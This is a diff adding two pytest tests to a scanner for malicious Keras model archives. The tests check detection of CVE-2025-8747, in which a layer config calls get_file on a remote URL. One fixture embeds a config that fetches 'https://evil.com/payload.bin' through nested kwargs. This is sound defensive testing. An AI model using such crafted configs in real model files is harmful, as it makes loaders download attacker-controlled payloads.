@@ -924,6 +924,54 @@ class TestCVE20258747GetFileGadget:
         assert len(cve_issues) >= 1, "Should detect get_file + URL in args list as CVE-2025-8747"
         assert cve_issues[0].severity == IssueSeverity.CRITICAL
 
+    def test_get_file_with_url_in_nested_kwargs_detected(self, tmp_path: Path) -> None:
+        """Nested kwargs URL should still be attributed to the get_file invocation."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {
+                            "fn": "get_file",
+                            "kwargs": {"url": "https://evil.com/payload.bin"},
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
+        assert len(cve_issues) >= 1, "Should detect get_file + URL in nested kwargs as CVE-2025-8747"
+        assert cve_issues[0].severity == IssueSeverity.CRITICAL
+
+    def test_get_file_with_nested_metadata_url_not_flagged(self, tmp_path: Path) -> None:
+        """Nested metadata URLs in the same node should not be treated as get_file arguments."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {
+                            "fn": "get_file",
+                            "metadata": {"homepage": "https://example.com/model-docs"},
+                            "path": "/local/file.h5",
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
+        assert cve_issues == [], "Nested metadata URLs should not trigger CVE-2025-8747"
+
     def test_get_file_with_url_and_comment_token_detected(self, tmp_path: Path) -> None:
         """Embedded comment tokens in URL strings should not suppress detection."""
         scanner = KerasZipScanner()
